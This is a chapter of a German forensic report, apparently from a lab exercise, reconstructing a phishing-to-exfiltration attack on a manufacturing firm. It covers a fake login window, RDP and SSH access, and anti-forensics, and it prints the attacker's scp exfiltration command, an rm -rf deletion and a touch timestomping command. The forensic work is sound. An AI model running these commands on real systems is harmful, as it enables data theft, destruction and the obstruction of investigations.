= Detaillierte Rekonstruktion des Angriffs (Attack Lifecycle)

Dieser Abschnitt fasst den *aus den Einzelbefunden rekonstruierten* Angriffsverlauf
zusammenhängend zusammen. Er nimmt keine neue Beweisführung vor, sondern
verdichtet die in den Analysekapiteln (Netzwerk, Server, Client, RAM,
Datenträger) belegten und in @kap-present korrelierten Befunde zu einer
narrativen Gesamtschau. Die zugrunde liegenden Belege und Finding-IDs finden
sich in den jeweiligen Fachkapiteln.

== Phase 1: Initialer Zugriff über Spear-Phishing

Der Angriff begann mit einer gezielten Phishing-E-Mail (Spear-Phishing) an den Mitarbeiter *Markus Vogel* (`m.vogel@bayern-praezision.de`).

- *Täuschung:* Die E-Mail tarnte sich als dringendes internes Sicherheitsupdate der IT-Abteilung (`it-support@bayern-praezision.de`) für die "CNC-Konstruktionssoftware".
- *Aufforderung:* Das Opfer wurde angewiesen, das angehängte Archiv `App.zip` auf dem Desktop zu entpacken und die darin enthaltene Datei `main.py` per Doppelklick auszuführen.

#figure(
  image("../res/Images_Attack/Email.png", width: 85%),
  caption: [Gezielte Spear-Phishing-E-Mail an Markus Vogel],
) <fig-phishing-email>

== Phase 2: Credential Harvesting (Sammeln von Zugangsdaten)

Nachdem das Opfer die Python-Datei `main.py` ausgeführt hatte, öffnete sich ein gefälschtes Anmeldefenster mit dem Titel "Windows Sicherheit".

- Das Fenster forderte die Eingabe von Windows-Benutzernamen und Windows-Passwort.
- Da das Opfer der vermeintlichen IT-Anweisung vertraute, gab es seine Domänen-Zugangsdaten ein. Diese wurden im Klartext direkt an den Angreifer übermittelt.

#figure(
  image("../res/Images_Attack/fake_login.png", width: 60%),
  caption: [Gefälschtes Login-Fenster der Schadsoftware (main.py)],
) <fig-fake-login>

== Phase 3: Lateral Movement & Aufklärung über RDP

Mit den gestohlenen Anmeldedaten des Benutzers "vogel" verschaffte sich der Angreifer per *Remote Desktop (RDP)* Zugriff auf den Arbeitsplatz-Client des Opfers (IP: `192.168.50.30`).

- Während der Sitzung durchsuchte der Angreifer das System nach weiteren sensiblen Informationen.
- Auf dem Desktop stieß der Angreifer auf eine Textdatei namens `credentials.txt`. Diese Datei enthielt im Klartext die Zugangsdaten für den zentralen Projektserver sowie dessen IP-Adresse (`192.168.50.20`).

#figure(
  image("../res/Images_Attack/credentials.png", width: 80%),
  caption: [Gefundene Klartext-Zugangsdaten auf dem Desktop des Opfers],
) <fig-credentials-txt>

== Phase 4: Privilegiendiebstahl & Server-Kompromittierung (SSH)

Unter Verwendung der neu entdeckten Server-Credentials meldete sich der Angreifer über seinen Kali-Linux-Host per *SSH* am Projektserver (`192.168.50.20`) an.

- Mit dem Befehl `ls -la /srv/projekte/Projekte/` verschaffte sich der Angreifer einen Überblick über die dort gelagerten Konstruktionsdaten.

== Phase 5: Datenexfiltration (Diebstahl der Dateien)

Um die sensiblen Konstruktions- und Kundendaten dauerhaft zu stehlen, initiierte der Angreifer von seiner Angreiferplattform aus einen rekursiven Secure Copy Transfer (*SCP*):

```bash
scp -r m.vogel@192.168.50.20:/srv/projekte ~/exfil_projekte
```

#figure(
  image("../res/Images_Attack/new_scp_exfil.png", width: 90%),
  caption: [Ausführung des SCP-Befehls zur Datenexfiltration auf dem Kali-Host],
) <fig-scp-exfiltration>

Dadurch wurden alle kritischen Verzeichnisse des Unternehmens erfolgreich auf die Maschine des Angreifers kopiert. Darunter befanden sich Kundenlisten (`kunden_2026.csv`) sowie CAD-Modelle (`antriebsachse.step` und `cnc_steuerung_v2.step`).

#figure(
  image("../res/Images_Attack/exfil_file_list.png", width: 85%),
  caption: [Lokale Überprüfung der exfiltrierten Ordnerstrukturen und Dateien],
) <fig-exfil-files-list>

== Anti-Forensik: Spurenverwischung durch den Angreifer

Der Angreifer versuchte im Nachgang, den Einbruch zu verschleiern und die Ermittlungen zu sabotieren:

- *Datenlöschung:* Nach dem erfolgreichen Download löschte der Angreifer die Originaldaten auf dem Server mittels:

```bash
rm -rf /srv/projekte/Projekte/*
```

- *Timestomping (Zeitstempel-Manipulation):* Um das wahre Tatdatum zu verbergen, manipulierte der Angreifer die MAC-Zeiten (Modify, Access, Change) der verbliebenen Kundenliste mithilfe des `touch`-Befehls künstlich auf den 01. Januar 2024:

```bash
touch -t 202401010000 /srv/projekte/Kunden/kunden_2026.csv
```

#figure(
  image("../res/Images_Attack/server_command_log.png", width: 90%),
  caption: [Konsolen-Verlauf auf dem Server: Löschung, Timestomping und Überprüfung mittels stat],
) <fig-server-commands-log>